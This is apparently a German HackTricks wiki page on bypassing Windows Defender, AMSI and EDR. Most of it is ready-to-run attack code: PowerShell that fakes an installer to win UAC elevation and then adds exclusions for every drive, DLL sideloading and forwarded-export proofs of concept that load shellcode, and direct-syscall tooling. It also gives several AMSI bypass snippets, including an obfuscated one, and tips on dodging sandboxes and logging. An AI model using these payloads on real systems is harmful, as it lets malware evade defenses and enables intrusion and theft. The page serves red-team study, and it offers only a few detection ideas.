# Antivirus (AV)-Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** geschrieben!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender zu stoppen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender zu stoppen, indem es ein anderes AV vortäuscht.
- [Defender deaktivieren, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

### UAC-Köder im Installer-Stil, bevor Defender manipuliert wird

Öffentlich verfügbare Loader, die sich als Game-Cheats ausgeben, werden häufig als unsignierte Node.js-/Nexe-Installer bereitgestellt, die zuerst **den Benutzer zur Erhöhung der Berechtigungen auffordern** und erst dann Defender deaktivieren. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob administrative Rechte vorliegen. Der Befehl ist nur erfolgreich, wenn der aufrufende Prozess Admin-Rechte hat. Ein Fehlschlag bedeutet also, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort mit dem Verb `RunAs` neu starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Die Opfer glauben bereits, dass sie „gecrackte“ Software installieren, und akzeptieren die Aufforderung daher normalerweise. So erhält die Malware die Rechte, die sie benötigt, um die Richtlinie von Defender zu ändern.<sup>[[26]](#references)</sup>

### Pauschale `MpPreference`-Ausnahmen für jeden Laufwerksbuchstaben

Nach der Rechteausweitung maximieren GachiLoader-artige Ketten die blinden Flecken von Defender, anstatt den Dienst direkt zu deaktivieren. Der Loader beendet zunächst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und fügt dann **extrem weitreichende Ausnahmen** hinzu, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr gescannt werden kann:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Wichtige Beobachtungen:

- Die Schleife durchläuft jedes eingebundene Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **jede künftig irgendwo auf der Festplatte abgelegte Payload ignoriert wird**.
- Der Ausschluss der Erweiterung `.sys` ist zukunftsorientiert – Angreifer behalten sich damit die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anzurühren.
- Alle Änderungen werden unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` gespeichert. So können spätere Phasen bestätigen, dass die Ausschlüsse weiterhin gelten, oder sie erweitern, ohne erneut UAC auszulösen.

Da kein Defender-Dienst angehalten wird, melden oberflächliche Integritätsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitüberwachung diese Pfade nie überprüft.<sup>[[26]](#references)</sup>

## **AV-Evasion-Methodik**

AVs verwenden derzeit verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist: statische Erkennung, dynamische Analyse und bei den fortschrittlicheren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Bei der statischen Erkennung werden bekannte bösartige Zeichenfolgen oder Byte-Arrays in einer Binärdatei oder einem Skript markiert. Außerdem werden Informationen direkt aus der Datei ausgelesen (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Symbol, Prüfsumme usw.). Das bedeutet, dass du mit bekannten öffentlichen Tools leichter entdeckt werden kannst, da sie wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt einige Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binärdatei verschlüsselst, kann AV dein Programm nicht erkennen. Du benötigst jedoch eine Art Loader, der das Programm entschlüsselt und im Speicher ausführt.

- **Obfuskation**

Manchmal reicht es aus, einige Zeichenfolgen in deiner Binärdatei oder deinem Skript zu ändern, damit es AV passiert. Je nachdem, was du verschleiern möchtest, kann das jedoch zeitaufwendig sein.

- **Eigene Tools**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schädlichen Signaturen. Das kostet jedoch viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Das Tool teilt die Datei in mehrere Abschnitte auf und lässt Defender jeden davon einzeln überprüfen. So kann es dir genau zeigen, welche Zeichenfolgen oder Bytes in deiner Binärdatei markiert werden.

Ich empfehle dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt das AV deine Binärdatei in einer Sandbox aus und überwacht sie auf bösartige Aktivitäten (z. B. den Versuch, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen Minidump von LSASS zu erstellen usw.). Damit umzugehen kann etwas kniffliger sein. Hier sind jedoch einige Möglichkeiten, Sandboxes zu umgehen.

- **Vor der Ausführung warten** Je nach Implementierung kann dies eine gute Möglichkeit sein, die dynamische Analyse des AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu überprüfen, damit der Arbeitsablauf des Benutzers nicht unterbrochen wird. Lange Wartezeiten können daher die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes die Wartezeit je nach Implementierung einfach überspringen können.
- **Systemressourcen prüfen** Sandboxes verfügen üblicherweise nur über wenige Ressourcen (z. B. < 2 GB RAM), da sie andernfalls den Computer des Benutzers verlangsamen könnten. Hier kannst du auch kreativ werden, zum Beispiel die CPU-Temperatur oder sogar die Lüftergeschwindigkeit prüfen – nicht alles davon wird in der Sandbox simuliert.
- **Maschinenspezifische Prüfungen** Wenn du einen Benutzer angreifen möchtest, dessen Workstation der Domäne „contoso.local“ angehört, kannst du die Domäne des Computers prüfen und feststellen, ob sie der von dir angegebenen entspricht. Wenn nicht, kannst du dein Programm beenden lassen.

Wie sich herausstellt, lautet der Computername von Microsoft Defenders Sandbox HAL9TH. Du kannst also vor der Detonation in deiner Malware den Computernamen prüfen. Stimmt er mit HAL9TH überein, befindest du dich in Defenders Sandbox und kannst dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit), um Sandboxes zu umgehen:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie bereits in diesem Beitrag erwähnt, werden **öffentliche Tools** früher oder später **erkannt**. Daher solltest du dir eine Frage stellen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du dafür wirklich mimikatz verwenden**? Oder könntest du ein weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpt?

Die richtige Antwort ist wahrscheinlich Letzteres. Am Beispiel von mimikatz: Es ist vermutlich eines der – wenn nicht das – am häufigsten von AVs und EDRs markierten Malware-Projekte. Das Projekt selbst ist zwar großartig, aber die Umgehung von AVs damit ist ein Albtraum. Suche also nach Alternativen, mit denen du dein Ziel erreichen kannst.

> [!TIP]
> Wenn du deine Payloads zur Umgehung der Erkennung modifizierst, **deaktiviere die automatische Übermittlung von Beispielen** in Defender. Und bitte, wirklich: **Lade nichts auf VIRUSTOTAL hoch**, wenn du langfristig unerkannt bleiben möchtest. Wenn du prüfen willst, ob eine bestimmte AV-Lösung deine Payload erkennt, installiere sie auf einer VM, versuche die automatische Übermittlung von Beispielen zu deaktivieren und teste die Payload dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs. DLLs

Wenn möglich, solltest du für die Umgehung der Erkennung immer **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien gewöhnlich **deutlich seltener erkannt** und analysiert. In manchen Fällen ist das also ein ganz einfacher Trick, um einer Erkennung zu entgehen (sofern deine Payload natürlich als DLL ausgeführt werden kann).

Wie in diesem Bild zu sehen ist, hat eine DLL-Payload von Havoc auf antiscan.me eine Erkennungsrate von 4/26, während die EXE-Payload eine Erkennungsrate von 7/26 aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Vergleich auf antiscan.me zwischen einer normalen Havoc-EXE-Payload und einer normalen Havoc-DLL</p></figcaption></figure>

Nun zeigen wir einige Tricks, mit denen du DLL-Dateien deutlich unauffälliger machen kannst.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem die Opferanwendung und die schädlichen Payloads nebeneinander platziert werden.

Mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript kannst du nach Programmen suchen, die für DLL Sideloading anfällig sind:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking anfällig sind und sich in "C:\Program Files\\" befinden, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable-Programme selbst zu untersuchen**. Diese Technik ist bei korrekter Ausführung ziemlich unauffällig. Wenn du jedoch öffentlich bekannte DLL Sideloadable-Programme verwendest, kannst du leicht entdeckt werden.

Eine bösartige DLL mit dem Namen abzulegen, den ein Programm zu laden erwartet, reicht nicht aus, um dein Payload zu laden, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine weitere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm macht, vom Proxy (und der bösartigen) DLL an die ursprüngliche DLL weiter. So bleibt die Funktionalität des Programms erhalten und dein Payload kann ausgeführt werden.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich ausgeführt habe:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die umbenannte Original-DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) codiert) als auch die Proxy-DLL haben auf [antiscan.me](https://antiscan.me) eine Erkennungsrate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dir das [Twitch-VOD von S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) über DLL Sideloading sowie [ippsecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über die besprochenen Themen zu erfahren.

### Weitergeleitete Exports missbrauchen (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die eigentlich „Forwarder“ sind: Statt auf Code zu verweisen, enthält der Exporteintrag eine ASCII-Zeichenfolge im Format `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows-Loader folgende Schritte aus:

- `TargetDll` laden, sofern sie nicht bereits geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die auch das Verzeichnis des Moduls einschließt, das die Weiterleitung auflöst.

Dies ermöglicht eine indirekte Sideloading-Technik: Finde eine signierte DLL, die eine Funktion exportiert, deren Weiterleitung auf einen Modulnamen verweist, der keine KnownDLL ist. Lege diese signierte DLL dann im selben Verzeichnis wie eine vom Angreifer kontrollierte DLL ab, die exakt wie das weitergeleitete Zielmodul heißt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` ist keine KnownDLL und wird daher über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Die signierte System-DLL in einen beschreibbaren Ordner kopieren.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales `DllMain` reicht aus, um Code auszuführen; du musst die weitergeleitete Funktion nicht implementieren, damit `DllMain` ausgelöst wird.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Lösen Sie die Weiterleitung mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Beobachtetes Verhalten:
- rundll32 (signiert) lädt die Side-by-Side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt anschließend `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du erst dann einen „missing API“-Fehler, nachdem `DllMain` bereits ausgeführt wurde

Tipps zur Suche:
- Konzentriere dich auf weitergeleitete Exports, bei denen das Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Du kannst weitergeleitete Exports mit Tools wie den folgenden auflisten:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows-11-Forwarder-Inventar, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Erkennung/Abwehr:
- LOLBins (z. B. rundll32.exe) überwachen, die signierte DLLs aus Nicht-Systempfaden laden und anschließend Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis laden
- Bei Prozess-/Modulketten wie `rundll32.exe` → nicht-systemeigenes `keyiso.dll` → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden alarmieren
- Code-Integritätsrichtlinien (WDAC/AppLocker) durchsetzen und Schreib- sowie Ausführungsrechte in Anwendungsverzeichnissen verweigern

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Mit Freeze kannst du deinen shellcode unauffällig laden und ausführen.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlass dich daher nie nur auf ein einziges Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu kombinieren.

## Direkte/indirekte Syscalls & SSN-Auflösung (SysWhispers4)

EDRs setzen häufig **Inline-Hooks im User-Mode** auf Syscall-Stubs von `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **direkte** oder **indirekte** Syscall-Stubs generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Entry-Point auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Eine `syscall`-/`sysenter`-/`SVC #0`-Instruktion wird im generierten Stub ausgegeben (kein Aufruf eines `ntdll`-Exports).
- **Indirect**: Springt zu einem vorhandenen `syscall`-Gadget in `ntdll`, sodass der Kernel-Übergang scheinbar von `ntdll` ausgeht (nützlich zur Umgehung heuristischer Erkennung); **randomized indirect** wählt bei jedem Aufruf ein Gadget aus einem Pool aus.
- **Egg-hunt**: Vermeidet es, die statische Opcode-Sequenz `0F 05` auf dem Datenträger einzubetten; löst eine Syscall-Sequenz zur Laufzeit auf.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: Leitet SSNs ab, indem Syscall-Stubs nach virtueller Adresse sortiert werden, statt Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Bindet eine saubere `\KnownDlls\ntdll.dll` ein, liest SSNs aus ihrem `.text`-Abschnitt und hebt anschließend die Zuordnung auf (umgeht alle In-Memory-Hooks).
- **RecycledGate**: Kombiniert die SSN-Ableitung durch VA-Sortierung mit einer Opcode-Validierung, wenn ein Stub sauber ist; greift bei Hooks auf die VA-Ableitung zurück.
- **HW Breakpoint**: Setzt DR0 auf die `syscall`-Instruktion und verwendet einen VEH, um die SSN zur Laufzeit aus `EAX` auszulesen, ohne gehookte Bytes zu parsen.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)“ zu verhindern. Anfangs konnten AVs nur **Dateien auf der Festplatte** scannen. Wenn man Payloads also irgendwie **direkt im Arbeitsspeicher** ausführen konnte, konnte der AV nichts dagegen tun, da er nicht genügend Einblick hatte.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert:

- Benutzerkontensteuerung (User Account Control, UAC; Erhöhung von EXE-, COM- und MSI-Dateien oder Installation von ActiveX)
- PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Sie ermöglicht Antivirenlösungen, das Verhalten von Skripten zu überprüfen, indem Skriptinhalte in unverschlüsselter und nicht verschleierter Form bereitgestellt werden.

Bei der Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wird in Windows Defender die folgende Warnung angezeigt.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, dass `amsi:` vorangestellt wird, gefolgt vom Pfad der ausführbaren Datei, über die das Skript ausgeführt wurde, in diesem Fall powershell.exe.

Wir haben keine Datei auf der Festplatte abgelegt, wurden aber trotzdem im Arbeitsspeicher von AMSI erkannt.

Außerdem wird C#-Code seit **.NET 4.8** ebenfalls durch AMSI ausgeführt. Das betrifft sogar `Assembly.Load(byte[])`, um Code im Arbeitsspeicher auszuführen. Deshalb wird für die Ausführung im Arbeitsspeicher die Verwendung älterer .NET-Versionen (wie 4.7.2 oder niedriger) empfohlen, wenn AMSI umgangen werden soll.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Verschleierung**

Da AMSI hauptsächlich mit statischen Erkennungsverfahren arbeitet, kann das Ändern der Skripte, die geladen werden sollen, eine gute Möglichkeit sein, der Erkennung zu entgehen.

AMSI kann Skripte jedoch auch dann entschleiern, wenn sie mehrere Verschleierungsebenen enthalten. Je nach Vorgehensweise kann Verschleierung daher eine schlechte Option sein. Dadurch ist das Umgehen nicht ganz unkompliziert. Manchmal reicht es aber, ein paar Variablennamen zu ändern. Es kommt also darauf an, wie stark etwas bereits erkannt wird.

- **AMSI Bypass**

Da AMSI implementiert wird, indem eine DLL in den Prozess von powershell (sowie cscript.exe, wscript.exe usw.) geladen wird, lässt sich die DLL leicht manipulieren, sogar als unprivilegierter Benutzer. Aufgrund dieses Fehlers in der AMSI-Implementierung haben Forschende mehrere Möglichkeiten gefunden, den AMSI-Scan zu umgehen.

**Einen Fehler erzwingen**

Wenn die AMSI-Initialisierung fehlschlägt (`amsiInitFailed`), wird für den aktuellen Prozess kein Scan gestartet. Dies wurde ursprünglich von [Matt Graeber](https://twitter.com/mattifestation) offengelegt. Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Es genügte eine einzige Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher muss sie leicht abgeändert werden, um diese Technik anzuwenden.

Hier ist ein modifizierter AMSI Bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Beachte, dass dieser Beitrag wahrscheinlich markiert wird, sobald er veröffentlicht ist. Du solltest also keinen Code veröffentlichen, wenn du unentdeckt bleiben möchtest.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Dabei wird die Adresse der Funktion „AmsiScanBuffer“ in amsi.dll (zuständig für das Scannen der vom Benutzer bereitgestellten Eingabe) gesucht und mit Anweisungen überschrieben, die den Code für E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als unbedenkliches Ergebnis interpretiert wird.

> [!TIP]
> Lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt außerdem viele weitere Techniken, um AMSI mit powershell zu umgehen. Auf [**dieser Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und in [**diesem Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) erfährst du mehr darüber.

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und es werden in diesem Prozess keine Scans durchgeführt.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64-C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert gleichermaßen mit PowerShell, WScript/CScript und benutzerdefinierten Loadern (mit allem, was andernfalls AMSI laden würde).
- In Kombination mit der Übergabe von Skripten über stdin verwenden (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Befehlszeilen-Artefakte zu vermeiden.
- Wurde bei Loadern beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls Skripte zum Umgehen von AMSI.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls Skripte zum Umgehen von AMSI, die Signaturen durch zufällig generierte benutzerdefinierte Funktionen, Variablen und Zeichenausdrücke vermeiden. Außerdem wird die Groß-/Kleinschreibung von PowerShell-Schlüsselwörtern zufällig verändert, um Signaturerkennung zu vermeiden.

**Die erkannte Signatur entfernen**

Mit Tools wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kannst du die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses entfernen. Dieses Tool durchsucht den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreibt sie anschließend mit NOP-Anweisungen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste der AV/EDR-Produkte, die AMSI verwenden, findest du unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell-Version 2 verwenden**
Wenn du PowerShell-Version 2 verwendest, wird AMSI nicht geladen. Daher kannst du deine Skripte ausführen, ohne dass sie von AMSI gescannt werden. Das geht so:

```bash
powershell.exe -version 2
```

## PowerShell-Logging

PowerShell-Logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Dies kann für Audits und die Fehlerbehebung nützlich sein, aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um PowerShell-Logging zu umgehen, kannst du die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Dafür kannst du ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell Version 2 verwenden**: Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne dass sie von AMSI gescannt werden. So geht's: `powershell.exe -version 2`
- **Eine nicht verwaltete PowerShell-Sitzung verwenden**: Verwende [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (der von Cobalt Strikes `powerpick` verwendete Ansatz). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Abwehrmaßnahmen werden dadurch jedoch nicht automatisch deaktiviert; die Abdeckung hängt von der Laufzeitumgebung und der Host-Implementierung ab.


## Obfuskation

> [!TIP]
> Mehrere Obfuskationstechniken basieren auf der Verschlüsselung von Daten. Dadurch erhöht sich die Entropie der Binärdatei, wodurch AVs und EDRs sie leichter erkennen können. Sei dabei vorsichtig und wende Verschlüsselung gegebenenfalls nur auf bestimmte Abschnitte deines Codes an, die sensibel sind oder verborgen werden müssen.

### Deobfuskation von mit ConfuserEx geschützten .NET-Binärdateien

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzebenen, die Decompiler und Sandboxes blockieren. Der folgende Workflow **stellt zuverlässig ein nahezu ursprüngliches IL wieder her**, das anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

